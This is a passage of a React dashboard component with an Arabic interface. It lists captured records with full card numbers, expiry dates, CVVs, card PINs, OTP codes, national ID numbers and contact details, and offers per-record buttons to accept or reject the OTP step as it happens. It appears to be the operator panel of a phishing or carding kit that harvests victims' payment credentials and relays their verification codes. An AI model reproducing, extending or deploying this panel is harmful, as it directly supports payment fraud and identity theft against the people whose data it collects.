                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="bg-red-500 dark:bg-red-600 text-white hover:bg-red-600 dark:hover:bg-red-700"
                                >
                                  رفض
                                </Button>
                                <TooltipProvider>
                                  <Tooltip>
                                    <TooltipTrigger asChild>
                                      <Button
                                        variant="ghost"
                                        size="icon"
                                        onClick={() => handleDelete(notification.id)}
                                        className="h-8 w-8 text-red-500 dark:text-red-400 hover:text-red-600 dark:hover:text-red-300 hover:bg-red-100 dark:hover:bg-red-900/30"
                                      >
                                        <Trash2 className="h-4 w-4" />
                                      </Button>
                                    </TooltipTrigger>
                                    <TooltipContent>
                                      <p>حذف الإشعار</p>
                                    </TooltipContent>
                                  </Tooltip>
                                </TooltipProvider>
                              </div>
                            </td>
                          </tr>
                        ))}
                        {filteredNotifications.length === 0 && (
                          <tr>
                            <td colSpan={7} className="px-4 py-8 text-center text-muted-foreground">
                              لا توجد إشعارات متطابقة مع الفلتر المحدد
                            </td>
                          </tr>
                        )}
                      </tbody>
                    </table>
                  </div>

                  {/* Mobile Card View for card tab */}
                  <div className="md:hidden space-y-4 p-4">
                    {paginatedNotifications.length > 0 ? (
                      paginatedNotifications.map((notification) => (
                        <Card
                          key={notification.id}
                          className={`overflow-hidden bg-card border-border ${getRowBackgroundColor(notification?.flagColor!)}`}
                        >
                          <CardContent className="p-4">
                            {/* Same mobile card structure as in "all" tab */}
                            <div className="flex justify-between items-start mb-3">
                              <div>
                                <div className="font-semibold">{notification.country || "غير معروف"}</div>
                              </div>
                              <div className="flex items-center gap-2">
                                <FlagColorSelector
                                  notificationId={notification.id}
                                  currentColor={notification.flagColor || null}
                                  onColorChange={handleFlagColorChange}
                                />
                                <UserStatus userId={notification.id} />
                              </div>
                            </div>

                            <div className="grid grid-cols-1 gap-3 mb-3">
                              <div className="flex flex-wrap gap-2">
                                <Badge
                                  variant={notification.name ? "secondary" : "outline"}
                                  className="rounded-md cursor-pointer"
                                  onClick={() => handleInfoClick(notification, "personal")}
                                >
                                  <Info className="h-3 w-3 mr-1" />
                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                </Badge>
                                <Badge
                                  variant={notification.cardNumber ? "default" : "outline"}
                                  className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500 dark:bg-green-600" : ""}`}
                                  onClick={() => handleInfoClick(notification, "card")}
                                >
                                  <CreditCard className="h-3 w-3 mr-1" />
                                  {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                </Badge>
                              </div>

                              <div className="text-sm flex items-center">
                                <span className="font-medium ml-2">رمز التحقق:</span>
                                {notification?.otp ? (
                                  <Badge
                                    variant="outline"
                                    className="bg-blue-100 text-blue-700 dark:bg-blue-900 dark:text-blue-300 border-0"
                                  >
                                    {notification.otp}
                                  </Badge>
                                ) : (
                                  "-"
                                )}
                              </div>

                              <div className="text-sm flex items-center">
                                <Clock className="h-3 w-3 mr-1.5 text-muted-foreground" />
                                <span className="font-medium ml-2">الوقت:</span>{" "}
                                {notification.createdDate &&
                                  formatDistanceToNow(new Date(notification.createdDate), {
                                    addSuffix: true,
                                    locale: ar,
                                  })}
                              </div>

                              <div className="flex gap-2 mt-2">
                                <Button
                                  onClick={() => {
                                    handleApproval("approved", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="flex-1 bg-green-500 dark:bg-green-600 hover:bg-green-600 dark:hover:bg-green-700"
                                  size="sm"
                                >
                                  قبول
                                </Button>
                                <Button
                                  onClick={() => {
                                    handleApproval("rejected", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="flex-1"
                                  variant="destructive"
                                  size="sm"
                                >
                                  رفض
                                </Button>
                                <Button
                                  variant="outline"
                                  onClick={() => handleDelete(notification.id)}
                                  className="w-10 p-0"
                                  size="sm"
                                >
                                  <Trash2 className="h-4 w-4" />
                                </Button>
                              </div>
                              {message && (
                                <p className="text-green-500 dark:text-green-400 text-center mt-2">تم الارسال</p>
                              )}
                            </div>
                          </CardContent>
                        </Card>
                      ))
                    ) : (
                      <div className="text-center py-8 text-muted-foreground">
                        لا توجد إشعارات متطابقة مع الفلتر المحدد
                      </div>
                    )}
                  </div>

                  {/* Pagination Controls */}
                  {filteredNotifications.length > 0 && (
                    <div className="mt-4 px-4 pb-4">
                      <div className="flex flex-col sm:flex-row justify-between items-center gap-4">
                        <div className="text-sm text-muted-foreground">
                          عرض {(currentPage - 1) * itemsPerPage + 1} إلى{" "}
                          {Math.min(currentPage * itemsPerPage, filteredNotifications.length)} من{" "}
                          {filteredNotifications.length} إشعار
                        </div>

                        <div className="flex items-center gap-4">
                          <div className="flex items-center gap-2">
                            <span className="text-sm text-muted-foreground">عدد العناصر:</span>
                            <Select value={itemsPerPage.toString()} onValueChange={handleItemsPerPageChange}>
                              <SelectTrigger className="w-[80px]">
                                <SelectValue placeholder="10" />
                              </SelectTrigger>
                              <SelectContent>
                                <SelectItem value="5">5</SelectItem>
                                <SelectItem value="10">10</SelectItem>
                                <SelectItem value="20">20</SelectItem>
                                <SelectItem value="50">50</SelectItem>
                              </SelectContent>
                            </Select>
                          </div>

                          <Pagination>
                            <PaginationContent>
                              <PaginationItem>
                                <PaginationPrevious
                                  onClick={() => handlePageChange(currentPage - 1)}
                                  className={currentPage === 1 ? "pointer-events-none opacity-50" : "cursor-pointer"}
                                />
                              </PaginationItem>

                              {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
                                let pageNumber: number

                                if (totalPages <= 5) {
                                  // If 5 or fewer pages, show all page numbers
                                  pageNumber = i + 1
                                } else if (currentPage <= 3) {
                                  // If on pages 1-3, show pages 1-5
                                  pageNumber = i + 1
                                } else if (currentPage >= totalPages - 2) {
                                  // If on last 3 pages, show last 5 pages
                                  pageNumber = totalPages - 4 + i
                                } else {
                                  // Otherwise show current page and 2 pages on each side
                                  pageNumber = currentPage - 2 + i
                                }

                                return (
                                  <PaginationItem key={pageNumber}>
                                    <PaginationLink
                                      onClick={() => handlePageChange(pageNumber)}
                                      isActive={currentPage === pageNumber}
                                    >
                                      {pageNumber}
                                    </PaginationLink>
                                  </PaginationItem>
                                )
                              })}

                              {totalPages > 5 && currentPage < totalPages - 2 && (
                                <>
                                  <PaginationItem>
                                    <PaginationEllipsis />
                                  </PaginationItem>
                                  <PaginationItem>
                                    <PaginationLink onClick={() => handlePageChange(totalPages)}>
                                      {totalPages}
                                    </PaginationLink>
                                  </PaginationItem>
                                </>
                              )}

                              <PaginationItem>
                                <PaginationNext
                                  onClick={() => handlePageChange(currentPage + 1)}
                                  className={
                                    currentPage === totalPages ? "pointer-events-none opacity-50" : "cursor-pointer"
                                  }
                                />
                              </PaginationItem>
                            </PaginationContent>
                          </Pagination>
                        </div>
                      </div>
                    </div>
                  )}
                </ScrollArea>
              </TabsContent>

              <TabsContent value="online" className="m-0">
                <ScrollArea className="h-[calc(100vh-22rem)]">
                  {/* Same structure as other tabs but with online filtered data */}
                  <div className="hidden md:block">
                    <table className="w-full">
                      <thead>
                        <tr className="border-b border-border bg-muted/30">
                          <th className="px-4 py-3 text-right font-medium text-muted-foreground">الدولة</th>
                          <th className="px-4 py-3 text-right font-medium text-muted-foreground">المعلومات</th>
                          <th className="px-4 py-3 text-right font-medium text-muted-foreground">OTP</th>
                          <th className="px-4 py-3 text-right font-medium text-muted-foreground">الوقت</th>
                          <th className="px-4 py-3 text-center font-medium text-muted-foreground">الحالة</th>
                          <th className="px-4 py-3 text-center font-medium text-muted-foreground">العلم</th>
                          <th className="px-4 py-3 text-center font-medium text-muted-foreground">الإجراءات</th>
                        </tr>
                      </thead>
                      <tbody>
                        {paginatedNotifications.map((notification) => (
                          <tr
                            key={notification.id}
                            className={`border-b border-border ${getRowBackgroundColor(notification?.flagColor!)} transition-colors`}
                          >
                            <td className="px-4 py-3">{notification.country || "غير معروف"}</td>
                            <td className="px-4 py-3">
                              <div className="flex flex-wrap gap-2">
                                <Badge
                                  variant={notification.name ? "secondary" : "outline"}
                                  className="rounded-md cursor-pointer"
                                  onClick={() => handleInfoClick(notification, "personal")}
                                >
                                  <Info className="h-3 w-3 mr-1" />
                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                </Badge>
                                <Badge
                                  variant={notification.cardNumber ? "default" : "outline"}
                                  className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500 hover:bg-green-600 dark:bg-green-600 dark:hover:bg-green-700" : ""}`}
                                  onClick={() => handleInfoClick(notification, "card")}
                                >
                                  <CreditCard className="h-3 w-3 mr-1" />
                                  {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                </Badge>
                              </div>
                            </td>
                            <td className="px-4 py-3">
                              {notification?.otp ? (
                                <Badge
                                  variant="outline"
                                  className="bg-blue-100 text-blue-700 dark:bg-blue-900 dark:text-blue-300 border-0"
                                >
                                  {notification.otp}
                                </Badge>
                              ) : (
                                "-"
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap">
                              <div className="flex items-center">
                                <Clock className="h-3 w-3 mr-1.5 text-muted-foreground" />
                                <span className="text-sm">
                                  {notification.createdDate &&
                                    formatDistanceToNow(new Date(notification.createdDate), {
                                      addSuffix: true,
                                      locale: ar,
                                    })}
                                </span>
                              </div>
                            </td>
                            <td className="px-4 py-3 text-center">
                              <UserStatus userId={notification.id} />
                            </td>
                            <td className="px-4 py-3 text-center">
                              <FlagColorSelector
                                notificationId={notification.id}
                                currentColor={notification.flagColor || null}
                                onColorChange={handleFlagColorChange}
                              />
                            </td>
                            <td className="px-4 py-3 text-center">
                              <div className="flex justify-center gap-2">
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => {
                                    handleApproval("approved", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="bg-green-500 dark:bg-green-600 text-white hover:bg-green-600 dark:hover:bg-green-700"
                                >
                                  قبول
                                </Button>
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => {
                                    handleApproval("rejected", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="bg-red-500 dark:bg-red-600 text-white hover:bg-red-600 dark:hover:bg-red-700"
                                >
                                  رفض
                                </Button>
                                <TooltipProvider>
                                  <Tooltip>
                                    <TooltipTrigger asChild>
                                      <Button
                                        variant="ghost"
                                        size="icon"
                                        onClick={() => handleDelete(notification.id)}
                                        className="h-8 w-8 text-red-500 dark:text-red-400 hover:text-red-600 dark:hover:text-red-300 hover:bg-red-100 dark:hover:bg-red-900/30"
                                      >
                                        <Trash2 className="h-4 w-4" />
                                      </Button>
                                    </TooltipTrigger>
                                    <TooltipContent>
                                      <p>حذف الإشعار</p>
                                    </TooltipContent>
                                  </Tooltip>
                                </TooltipProvider>
                              </div>
                            </td>
                          </tr>
                        ))}
                        {paginatedNotifications.length === 0 && (
                          <tr>
                            <td colSpan={7} className="px-4 py-8 text-center text-muted-foreground">
                              لا توجد إشعارات متطابقة مع الفلتر المحدد
                            </td>
                          </tr>
                        )}
                      </tbody>
                    </table>
                  </div>

                  {/* Mobile Card View for online tab */}
                  <div className="md:hidden space-y-4 p-4">
                    {paginatedNotifications.length > 0 ? (
                      paginatedNotifications.map((notification) => (
                        <Card
                          key={notification.id}
                          className={`overflow-hidden bg-card border-border ${getRowBackgroundColor(notification?.flagColor!)}`}
                        >
                          <CardContent className="p-4">
                            {/* Same mobile card structure as in other tabs */}
                            <div className="flex justify-between items-start mb-3">
                              <div>
                                <div className="font-semibold">{notification.country || "غير معروف"}</div>
                              </div>
                              <div className="flex items-center gap-2">
                                <FlagColorSelector
                                  notificationId={notification.id}
                                  currentColor={notification.flagColor || null}
                                  onColorChange={handleFlagColorChange}
                                />
                                <UserStatus userId={notification.id} />
                              </div>
                            </div>

                            <div className="grid grid-cols-1 gap-3 mb-3">
                              <div className="flex flex-wrap gap-2">
                                <Badge
                                  variant={notification.name ? "secondary" : "outline"}
                                  className="rounded-md cursor-pointer"
                                  onClick={() => handleInfoClick(notification, "personal")}
                                >
                                  <Info className="h-3 w-3 mr-1" />
                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                </Badge>
                                <Badge
                                  variant={notification.cardNumber ? "default" : "outline"}
                                  className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500 dark:bg-green-600" : ""}`}
                                  onClick={() => handleInfoClick(notification, "card")}
                                >
                                  <CreditCard className="h-3 w-3 mr-1" />
                                  {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                </Badge>
                              </div>

                              <div className="text-sm flex items-center">
                                <span className="font-medium ml-2">رمز التحقق:</span>
                                {notification?.otp ? (
                                  <Badge
                                    variant="outline"
                                    className="bg-blue-100 text-blue-700 dark:bg-blue-900 dark:text-blue-300 border-0"
                                  >
                                    {notification.otp}
                                  </Badge>
                                ) : (
                                  "-"
                                )}
                              </div>

                              <div className="text-sm flex items-center">
                                <Clock className="h-3 w-3 mr-1.5 text-muted-foreground" />
                                <span className="font-medium ml-2">الوقت:</span>{" "}
                                {notification.createdDate &&
                                  formatDistanceToNow(new Date(notification.createdDate), {
                                    addSuffix: true,
                                    locale: ar,
                                  })}
                              </div>

                              <div className="flex gap-2 mt-2">
                                <Button
                                  onClick={() => {
                                    handleApproval("approved", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="flex-1 bg-green-500 dark:bg-green-600 hover:bg-green-600 dark:hover:bg-green-700"
                                  size="sm"
                                >
                                  قبول
                                </Button>
                                <Button
                                  onClick={() => {
                                    handleApproval("rejected", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="flex-1"
                                  variant="destructive"
                                  size="sm"
                                >
                                  رفض
                                </Button>
                                <Button
                                  variant="outline"
                                  onClick={() => handleDelete(notification.id)}
                                  className="w-10 p-0"
                                  size="sm"
                                >
                                  <Trash2 className="h-4 w-4" />
                                </Button>
                              </div>
                              {message && (
                                <p className="text-green-500 dark:text-green-400 text-center mt-2">تم الارسال</p>
                              )}
                            </div>
                          </CardContent>
                        </Card>
                      ))
                    ) : (
                      <div className="text-center py-8 text-muted-foreground">
                        لا توجد إشعارات متطابقة مع الفلتر المحدد
                      </div>
                    )}
                  </div>

                  {/* Pagination Controls */}
                  {filteredNotifications.length > 0 && (
                    <div className="mt-4 px-4 pb-4">
                      <div className="flex flex-col sm:flex-row justify-between items-center gap-4">
                        <div className="text-sm text-muted-foreground">
                          عرض {(currentPage - 1) * itemsPerPage + 1} إلى{" "}
                          {Math.min(currentPage * itemsPerPage, filteredNotifications.length)} من{" "}
                          {filteredNotifications.length} إشعار
                        </div>

                        <div className="flex items-center gap-4">
                          <div className="flex items-center gap-2">
                            <span className="text-sm text-muted-foreground">عدد العناصر:</span>
                            <Select value={itemsPerPage.toString()} onValueChange={handleItemsPerPageChange}>
                              <SelectTrigger className="w-[80px]">
                                <SelectValue placeholder="10" />
                              </SelectTrigger>
                              <SelectContent>
                                <SelectItem value="5">5</SelectItem>
                                <SelectItem value="10">10</SelectItem>
                                <SelectItem value="20">20</SelectItem>
                                <SelectItem value="50">50</SelectItem>
                              </SelectContent>
                            </Select>
                          </div>

                          <Pagination>
                            <PaginationContent>
                              <PaginationItem>
                                <PaginationPrevious
                                  onClick={() => handlePageChange(currentPage - 1)}
                                  className={currentPage === 1 ? "pointer-events-none opacity-50" : "cursor-pointer"}
                                />
                              </PaginationItem>

                              {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
                                let pageNumber: number

                                if (totalPages <= 5) {
                                  // If 5 or fewer pages, show all page numbers
                                  pageNumber = i + 1
                                } else if (currentPage <= 3) {
                                  // If on pages 1-3, show pages 1-5
                                  pageNumber = i + 1
                                } else if (currentPage >= totalPages - 2) {
                                  // If on last 3 pages, show last 5 pages
                                  pageNumber = totalPages - 4 + i
                                } else {
                                  // Otherwise show current page and 2 pages on each side
                                  pageNumber = currentPage - 2 + i
                                }

                                return (
                                  <PaginationItem key={pageNumber}>
                                    <PaginationLink
                                      onClick={() => handlePageChange(pageNumber)}
                                      isActive={currentPage === pageNumber}
                                    >
                                      {pageNumber}
                                    </PaginationLink>
                                  </PaginationItem>
                                )
                              })}

                              {totalPages > 5 && currentPage < totalPages - 2 && (
                                <>
                                  <PaginationItem>
                                    <PaginationEllipsis />
                                  </PaginationItem>
                                  <PaginationItem>
                                    <PaginationLink onClick={() => handlePageChange(totalPages)}>
                                      {totalPages}
                                    </PaginationLink>
                                  </PaginationItem>
                                </>
                              )}

                              <PaginationItem>
                                <PaginationNext
                                  onClick={() => handlePageChange(currentPage + 1)}
                                  className={
                                    currentPage === totalPages ? "pointer-events-none opacity-50" : "cursor-pointer"
                                  }
                                />
                              </PaginationItem>
                            </PaginationContent>
                          </Pagination>
                        </div>
                      </div>
                    </div>
                  )}
                </ScrollArea>
              </TabsContent>
            </Tabs>
          </Card>
        </div>
      </div>

      {/* Dialog for showing notification details */}
      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-background text-foreground max-w-[90vw] md:max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              {selectedInfo === "personal" ? (
                <>
                  <Info className="h-5 w-5 text-primary" />
                  المعلومات الشخصية
                </>
              ) : selectedInfo === "card" ? (
                <>
                  <CreditCard className="h-5 w-5 text-primary" />
                  معلومات البطاقة
                </>
              ) : (
                "معلومات عامة"
              )}
            </DialogTitle>
          </DialogHeader>
          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-3 p-4 bg-muted/50 rounded-lg border border-border">
              {selectedNotification.idNumber && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">رقم الهوية:</span>
                  <span className="font-semibold">{selectedNotification.idNumber}</span>
                </p>
              )}
              {selectedNotification.email && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">البريد الإلكتروني:</span>
                  <span className="font-semibold">{selectedNotification.email}</span>
                </p>
              )}
              {selectedNotification.mobile && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">رقم الجوال:</span>
                  <span className="font-semibold">{selectedNotification.mobile}</span>
                </p>
              )}
              {selectedNotification.name && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">الاسم:</span>
                  <span className="font-semibold">{selectedNotification.name}</span>
                </p>
              )}
              {selectedNotification.phone && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">الهاتف:</span>
                  <span className="font-semibold">{selectedNotification.phone}</span>
                </p>
              )}
            </div>
          )}
          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-3 p-4 bg-muted/50 rounded-lg border border-border">
              {selectedNotification.bank && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">البنك:</span>
                  <span className="font-semibold">{selectedNotification.bank}</span>
                </p>
              )}
              {selectedNotification.cardNumber && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">رقم البطاقة:</span>
                  <span className="font-semibold" dir="ltr">
                    {selectedNotification.prefix && (
                      <Badge
                        variant={"outline"}
                        className="bg-blue-100 dark:bg-blue-900 border-0 text-blue-700 dark:text-blue-300 mr-1"
                      >
                        {selectedNotification.prefix && `${selectedNotification.prefix}`}
                      </Badge>
                    )}
                    <Badge
                      variant={"outline"}
                      className="bg-green-100 dark:bg-green-900 border-0 text-green-700 dark:text-green-300"
                    >
                      {selectedNotification.cardNumber}
                    </Badge>
                  </span>
                </p>
              )}
              {(selectedNotification.year || selectedNotification.month || selectedNotification.cardExpiry) && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">تاريخ الانتهاء:</span>
                  <span className="font-semibold">
                    {selectedNotification.year && selectedNotification.month
                      ? `${selectedNotification.year}/${selectedNotification.month}`
                      : selectedNotification.cardExpiry}
                  </span>
                </p>
              )}
              {selectedNotification.pass && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">رمز البطاقة:</span>
                  <span className="font-semibold">{selectedNotification.pass}</span>
                </p>
              )}
              {(selectedNotification.otp || selectedNotification.otpCode) && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">رمز التحقق المرسل:</span>
                  <Badge className="font-semibold bg-green-600 text-white">
                    {selectedNotification.otp}
                    {selectedNotification.otpCode && ` || ${selectedNotification.otpCode}`}
                  </Badge>
                </p>
              )}
              {selectedNotification.cvv && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">رمز الامان:</span>
                  <span className="font-semibold">{selectedNotification.cvv}</span>
                </p>
              )}
              {selectedNotification.allOtps &&
                Array.isArray(selectedNotification.allOtps) &&
                selectedNotification.allOtps.length > 0 && (
                  <div>
                    <span className="font-medium text-muted-foreground block mb-2">جميع الرموز:</span>
                    <div className="flex flex-wrap gap-2">
                      {selectedNotification.allOtps.map((otp, index) => (
                        <Badge key={index} variant="outline" className="bg-muted">
                          {otp}
                        </Badge>
                      ))}
                    </div>
                  </div>
                )}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}
